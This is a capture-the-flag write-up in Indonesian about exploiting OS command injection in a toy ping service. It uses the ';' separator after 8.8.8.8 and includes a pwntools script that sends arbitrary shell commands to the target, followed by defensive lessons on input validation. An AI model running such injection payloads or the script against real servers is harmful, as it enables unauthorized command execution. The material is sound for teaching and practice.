# Ping Cmd

**Kategori**: Web / General Skills
**Difficulty**: Easy
**Points**: 100
**Solved by**: Zaky
**Tools**: Python, pwntools

---

## TL;DR

Server menyediakan fitur ping yang membatasi input hanya boleh `8.8.8.8`, namun tidak memfilter karakter pemisah command shell. Dengan menyisipkan `;` setelah `8.8.8.8`, command tambahan bisa dieksekusi di server (OS Command Injection).

---

## Challenge Description

> Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8')

**Files/Attachment**: Tidak ada
**Target**: `nc <host> <port>`

---

## Recon

- [x] Server minta input IP address untuk di-ping, dengan klaim hanya menerima `8.8.8.8`.
- [x] Dicoba input `8.8.8.8` polos → server merespon normal (hasil ping).
- [x] Dicurigai validasi di sisi server cuma cek apakah string **mengandung** `8.8.8.8`, bukan validasi ketat terhadap keseluruhan isi input.

---

## Analysis

Dicoba menambahkan command lain setelah `8.8.8.8` dengan separator `;` (chaining command di shell):

```
8.8.8.8;ls
```

**Hasil**: Server mengeksekusi dua command sekaligus — hasil `ping 8.8.8.8` dan hasil `ls` sama-sama muncul di response. Ini mengonfirmasi input user langsung di-passing ke shell tanpa sanitasi, klasik **OS Command Injection**.

---

## Exploitation

### Step 1 — Konfirmasi command injection

```
8.8.8.8;ls
```

Mengonfirmasi command tambahan setelah `;` ikut dieksekusi.

### Step 2 — Enumerasi file di direktori

```
8.8.8.8;ls -la
```

Ditemukan file yang mengandung flag (misalnya `flag.txt`) di direktori kerja server.

### Step 3 — Membaca isi flag

```
8.8.8.8;cat flag.txt
```

Flag muncul di response server.

### Step 4 — Otomasi dengan script

Dibuat script Python interaktif menggunakan `pwntools` agar bisa mencoba banyak command tanpa mengulang koneksi manual tiap kali:

```python
from pwn import *

context.log_level = "error"

HOST = input("Masukkan hostname: ").strip()
PORT = input("Masukkan port: ").strip()

while True:
    COMMAND = input("Masukkan command: ").strip()
    FULL_COMMAND = "8.8.8.8;" + COMMAND
    if "exit" in COMMAND.lower():
        break

    conn = remote(HOST, PORT)
    conn.recvuntil(b"Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): ")
    conn.sendline(FULL_COMMAND.encode())
    response = conn.recvall().decode()

    if "academy" in response:
        print(f"Flag Found: {response[-50:].strip()}")
        break

    print(response)
```

---

## Obstacles / Dead Ends

- **Dicoba**: Menggunakan `&&` sebagai separator command.
  **Hasil**: Tidak bermasalah, tapi `;` lebih simpel karena tidak bergantung pada exit code command sebelumnya (command pertama, yaitu `ping 8.8.8.8`, kadang butuh waktu/response yang bisa memengaruhi exit status).
  **Solusi**: Tetap pakai `;` karena lebih predictable untuk chaining command yang independen satu sama lain.

---

## Flag

```
academy{...}
```

---

## Key Takeaways

- Validasi input berbasis "mengandung string X" (substring check) sangat rentan — harus validasi ketat (misalnya regex `^8\.8\.8\.8$` atau whitelist karakter) untuk mencegah command injection.
- Karakter shell metacharacter (`;`, `&&`, `|`, `` ` ``, `$()`) harus selalu diwaspadai ketika input user digunakan dalam pemanggilan shell command (`exec`, `system`, `os.popen`, dsb).
- Script interaktif dengan `pwntools` mempercepat eksplorasi manual dibanding kirim ulang request satu-satu secara manual.

---

## References

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
